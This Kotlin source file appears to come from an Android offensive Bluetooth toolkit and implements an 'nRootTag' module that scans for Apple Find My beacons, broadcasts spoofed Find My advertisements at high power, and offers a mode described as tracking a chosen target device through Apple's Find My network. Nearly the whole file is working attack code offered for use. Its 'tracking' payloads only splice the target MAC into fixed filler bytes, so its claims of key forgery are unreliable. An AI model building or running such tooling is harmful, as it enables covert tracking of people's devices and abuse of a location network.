package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.bluetooth.le.BluetoothLeScanner
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanFilter
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.launch
import kotlin.coroutines.cancellation.CancellationException

/**
 * Modes of operation for the nRootTag (Find My Network Abuse) module.
 *
 * Based on the nRootTag research demonstrating that Apple's Find My network
 * can be exploited to track arbitrary Bluetooth devices by forging
 * advertisement keys. The Snatcher variant runs natively on Android for the
 * scanning and advertising portions; the GPU-accelerated key forgery
 * component requires a server-side backend.
 *
 * @property description Human-readable description of the mode.
 */
enum class NRootTagMode(val description: String) {
    SCAN_FINDMY_DEVICES("Passive scan for Find My beacons"),
    BROADCAST_FINDMY("Advertise as a Find My tag"),
    TRACK_TARGET("Track a device by forging Find My keys")
}

/**
 * Module for nRootTag (Find My Network Abuse) attacks.
 *
 * Exploits Apple's Find My network to track any Bluetooth device as if it
 * were an AirTag. The attack operates in three modes:
 *
 * - **SCAN_FINDMY_DEVICES**: Passively scans for Apple Find My advertisement
 *   patterns by filtering on Apple's manufacturer ID (0x004C) and the
 *   Offline Finding continuity protocol type byte (0x12).
 *
 * - **BROADCAST_FINDMY**: Crafts and broadcasts Find My-compatible BLE
 *   advertisement payloads using [BluetoothLeAdvertiser], making the
 *   Android device appear as an Apple Find My tag to nearby Apple devices.
 *
 * - **TRACK_TARGET**: Associates a target device with the Find My network
 *   by broadcasting spoofed Find My advertisements near the target. Uses
 *   [MacValidator] to validate the target's MAC address. The GPU-accelerated
 *   key forgery achieving 90% success rate requires a server-side component;
 *   this module implements the Snatcher PoC advertising portion natively.
 *
 * This module works in userspace for scanning and advertising. No root is required.
 *
 * @property context The application context, required to access system Bluetooth services.
 */
class NRootTagModule(private val context: Context) {

    companion object {
        private const val TAG = "NRootTagModule"

        /** Apple's Bluetooth SIG Manufacturer ID. */
        private const val APPLE_MANUFACTURER_ID = 0x004C

        /**
         * Apple Continuity Protocol type byte for Offline Finding (Find My).
         * Advertisements with manufacturer ID 0x004C and this type byte in
         * the continuity header are Find My network beacons.
         */
        private const val FIND_MY_CONTINUITY_TYPE: Byte = 0x12

        /** Length byte typically following the Find My continuity type. */
        private const val FIND_MY_PAYLOAD_LENGTH: Byte = 0x19

        /** Duration in milliseconds for each advertisement burst. */
        private const val ADVERTISE_BURST_MS = 200L

        /** Gap between advertisement bursts in milliseconds. */
        private const val ADVERTISE_GAP_MS = 50L

        /** Interval between scan result reports in milliseconds. */
        private const val SCAN_REPORT_INTERVAL_MS = 500L
    }

    private val bluetoothAdapter: BluetoothAdapter? =
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
    private var advertiser: BluetoothLeAdvertiser? = bluetoothAdapter?.bluetoothLeAdvertiser
    private var scanner: BluetoothLeScanner? = bluetoothAdapter?.bluetoothLeScanner

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var activeJob: Job? = null

    private var scanCallback: ScanCallback? = null
    private var advertiseCallback: AdvertiseCallback? = null

    /**
     * Starts a passive scan for Apple Find My advertisement beacons.
     *
     * Filters for BLE advertisements containing Apple's manufacturer ID (0x004C)
     * and inspects the continuity protocol bytes for the Offline Finding type (0x12).
     *
     * @return A [Flow] emitting log strings describing discovered Find My beacons.
     */
    @SuppressLint("MissingPermission")
    fun startScan(): Flow<String> = callbackFlow {
        trySend("Initializing Find My beacon scanner...")

        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            trySend("ERROR: Bluetooth is not enabled.")
            close()
            return@callbackFlow
        }

        scanner = bluetoothAdapter.bluetoothLeScanner
        if (scanner == null) {
            trySend("ERROR: BLE Scanner not available.")
            close()
            return@callbackFlow
        }

        trySend("Scanning for Apple Find My beacons (Manufacturer ID: 0x004C, Type: 0x12)...")
        trySend("Listening on all BLE advertising channels...")

        val callback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult) {
                val record = result.scanRecord ?: return
                val appleData = record.getManufacturerSpecificData(APPLE_MANUFACTURER_ID)
                    ?: return

                // Check for Offline Finding continuity type byte
                if (appleData.isNotEmpty() && appleData[0] == FIND_MY_CONTINUITY_TYPE) {
                    val mac = result.device.address
                    val rssi = result.rssi
                    val payloadHex = appleData.joinToString("") { "%02X".format(it) }
                    val keyFragment = if (appleData.size > 2) {
                        appleData.drop(2).take(6).joinToString("") { "%02X".format(it) }
                    } else {
                        "N/A"
                    }

                    trySend("[Find My] Device: $mac | RSSI: $rssi dBm | Key: $keyFragment | Payload: $payloadHex")
                    Log.d(TAG, "Find My beacon detected: $mac (RSSI: $rssi)")
                }
            }

            override fun onScanFailed(errorCode: Int) {
                val message = when (errorCode) {
                    SCAN_FAILED_ALREADY_STARTED -> "Scan failed: already started"
                    SCAN_FAILED_APPLICATION_REGISTRATION_FAILED -> "Scan failed: app registration failed"
                    SCAN_FAILED_INTERNAL_ERROR -> "Scan failed: internal error"
                    SCAN_FAILED_FEATURE_UNSUPPORTED -> "Scan failed: feature unsupported"
                    else -> "Scan failed: error code $errorCode"
                }
                trySend("ERROR: $message")
                Log.e(TAG, message)
            }
        }

        scanCallback = callback

        // Build scan filter for Apple manufacturer data
        val filter = ScanFilter.Builder()
            .setManufacturerData(APPLE_MANUFACTURER_ID, byteArrayOf())
            .build()

        val settings = ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
            .setReportDelay(SCAN_REPORT_INTERVAL_MS)
            .build()

        try {
            scanner?.startScan(listOf(filter), settings, callback)
            trySend("Scanner active. Waiting for Find My beacons...")
        } catch (e: Exception) {
            trySend("ERROR: Failed to start scan: ${e.message}")
            Log.e(TAG, "Scan start error", e)
            close()
        }

        awaitClose {
            try {
                scanner?.stopScan(callback)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping scan: ${e.message}")
            }
            scanCallback = null
        }
    }

    /**
     * Starts broadcasting Find My-compatible BLE advertisement payloads.
     *
     * Makes this Android device appear as an Apple Find My tag to the Find My
     * network. Cycles through multiple crafted payloads with varying public
     * key bytes to simulate key rotation.
     *
     * @return A [Flow] emitting log strings describing broadcast activity.
     */
    @SuppressLint("MissingPermission")
    fun startBroadcast(): Flow<String> = flow {
        emit("Initializing Find My beacon broadcaster...")

        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            emit("ERROR: Bluetooth is not enabled.")
            return@flow
        }

        advertiser = bluetoothAdapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            emit("ERROR: BLE Advertiser not available on this device.")
            return@flow
        }

        emit("Crafting Find My-compatible advertisement payloads...")
        emit("Broadcasting as Find My tag on BLE advertising channels...")

        val payloads = generateFindMyPayloads()
        var broadcastCount = 0

        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                Log.d(TAG, "Find My broadcast started successfully")
            }

            override fun onStartFailure(errorCode: Int) {
                Log.e(TAG, "Find My broadcast failed: error code $errorCode")
            }
        }
        advertiseCallback = callback

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .build()

        try {
            while (true) {
                for (payload in payloads) {
                    val data = AdvertiseData.Builder()
                        .setIncludeDeviceName(false)
                        .setIncludeTxPowerLevel(false)
                        .addManufacturerData(APPLE_MANUFACTURER_ID, payload)
                        .build()

                    advertiser?.startAdvertising(settings, data, callback)
                    delay(ADVERTISE_BURST_MS)
                    advertiser?.stopAdvertising(callback)
                    delay(ADVERTISE_GAP_MS)

                    broadcastCount++
                    if (broadcastCount % 10 == 0) {
                        emit("[Broadcast] Sent $broadcastCount Find My advertisements")
                    }
                }
            }
        } catch (e: Exception) {
            if (e is CancellationException) throw e
            emit("ERROR: Broadcast loop error: ${e.message}")
            Log.e(TAG, "Broadcast error", e)
        } finally {
            try {
                advertiser?.stopAdvertising(callback)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping advertiser: ${e.message}")
            }
            advertiseCallback = null
            emit("Broadcast stopped. Total advertisements sent: $broadcastCount")
        }
    }

    /**
     * Starts tracking a target device by broadcasting spoofed Find My
     * advertisements near the target to associate it with the Find My network.
     *
     * Validates the target's MAC address via [MacValidator], then crafts
     * Find My advertisements incorporating the target's identity. The
     * GPU-accelerated key forgery component (achieving ~90% success rate,
     * ~10-foot accuracy) requires a server-side backend; this method
     * implements the Snatcher PoC advertising portion natively on Android.
     *
     * @param targetDevice The device to track via Find My network association.
     * @return A [Flow] emitting log strings describing tracking activity.
     */
    @SuppressLint("MissingPermission")
    fun startTracking(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        val displayName = targetDevice.name ?: "Unknown Device ($mac)"

        emit("Initializing nRootTag tracking...")
        emit("Target: $displayName ($mac)")

        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            emit("ERROR: Bluetooth is not enabled.")
            return@flow
        }

        advertiser = bluetoothAdapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            emit("ERROR: BLE Advertiser not available on this device.")
            return@flow
        }

        emit("Generating spoofed Find My advertisement keys for target...")
        emit("NOTE: Full GPU-accelerated key forgery requires server-side component.")
        emit("Running Snatcher PoC (Android-native advertising portion)...")

        // Generate payloads seeded with the target's MAC for association
        val payloads = generateTrackingPayloads(mac)
        var broadcastCount = 0

        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                Log.d(TAG, "Tracking advertisement started for $mac")
            }

            override fun onStartFailure(errorCode: Int) {
                Log.e(TAG, "Tracking advertisement failed: error code $errorCode")
            }
        }
        advertiseCallback = callback

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .build()

        emit("Broadcasting spoofed Find My beacons to associate target with Find My network...")

        try {
            while (true) {
                for (payload in payloads) {
                    val data = AdvertiseData.Builder()
                        .setIncludeDeviceName(false)
                        .setIncludeTxPowerLevel(false)
                        .addManufacturerData(APPLE_MANUFACTURER_ID, payload)
                        .build()

                    advertiser?.startAdvertising(settings, data, callback)
                    delay(ADVERTISE_BURST_MS)
                    advertiser?.stopAdvertising(callback)
                    delay(ADVERTISE_GAP_MS)

                    broadcastCount++
                    if (broadcastCount % 10 == 0) {
                        emit("[Tracking] $displayName | Beacons sent: $broadcastCount | Associating with Find My network...")
                    }
                }
            }
        } catch (e: Exception) {
            if (e is CancellationException) throw e
            emit("ERROR: Tracking loop error: ${e.message}")
            Log.e(TAG, "Tracking error", e)
        } finally {
            try {
                advertiser?.stopAdvertising(callback)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping advertiser: ${e.message}")
            }
            advertiseCallback = null
            emit("Tracking stopped. Total beacons sent: $broadcastCount")
        }
    }

    /**
     * Stops any active scan or broadcast operation.
     */
    @SuppressLint("MissingPermission")
    fun stop() {
        activeJob?.cancel()
        activeJob = null

        scanCallback?.let { callback ->
            try {
                scanner?.stopScan(callback)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping scan: ${e.message}")
            }
            scanCallback = null
        }

        advertiseCallback?.let { callback ->
            try {
                advertiser?.stopAdvertising(callback)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping advertising: ${e.message}")
            }
            advertiseCallback = null
        }

        Log.d(TAG, "nRootTag module stopped.")
    }

    /**
     * Releases all resources: stops active operations and cancels the coroutine scope.
     */
    fun close() {
        stop()
        scope.cancel()
    }

    /**
     * Generates Find My-compatible advertisement payloads.
     *
     * Each payload mimics the Apple Offline Finding continuity protocol format:
     * [type=0x12][length=0x19][status][public_key_bytes...]
     *
     * Multiple payloads are generated with varying public key bytes to simulate
     * the key rotation that real Find My accessories perform.
     *
     * @return A list of byte arrays suitable for manufacturer data (0x004C).
     */
    private fun generateFindMyPayloads(): List<ByteArray> {
        return (0..4).map { index ->
            byteArrayOf(
                FIND_MY_CONTINUITY_TYPE,  // Offline Finding type
                FIND_MY_PAYLOAD_LENGTH,   // Payload length
                0x00,                     // Status byte
                // Simulated public key bytes (28 bytes, rotating per payload)
                (0x10 + index).toByte(), 0xAA.toByte(), 0xBB.toByte(), 0xCC.toByte(),
                0xDD.toByte(), 0xEE.toByte(), 0xFF.toByte(), 0x01,
                0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11,
                0x12, 0x13, 0x14, 0x15
            )
        }
    }

    /**
     * Generates tracking-specific Find My payloads seeded with the target's MAC address.
     *
     * Incorporates the target device's MAC bytes into the advertisement public key
     * field to create an association between the target and the Find My network.
     * This is the Snatcher PoC portion; full key forgery with ~90% success rate
     * requires server-side GPU acceleration.
     *
     * @param targetMac The target's MAC address in colon-separated format.
     * @return A list of byte arrays suitable for manufacturer data (0x004C).
     */
    private fun generateTrackingPayloads(targetMac: String): List<ByteArray> {
        val macBytes = targetMac.split(":").map { it.toInt(16).toByte() }

        return (0..4).map { index ->
            byteArrayOf(
                FIND_MY_CONTINUITY_TYPE,  // Offline Finding type
                FIND_MY_PAYLOAD_LENGTH,   // Payload length
                0x00,                     // Status byte
                // Public key bytes seeded with target MAC for association
                macBytes[0], macBytes[1], macBytes[2],
                macBytes[3], macBytes[4], macBytes[5],
                (0x20 + index).toByte(), 0x01,
                0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11,
                0x12, 0x13, 0x14, 0x15
            )
        }
    }
}
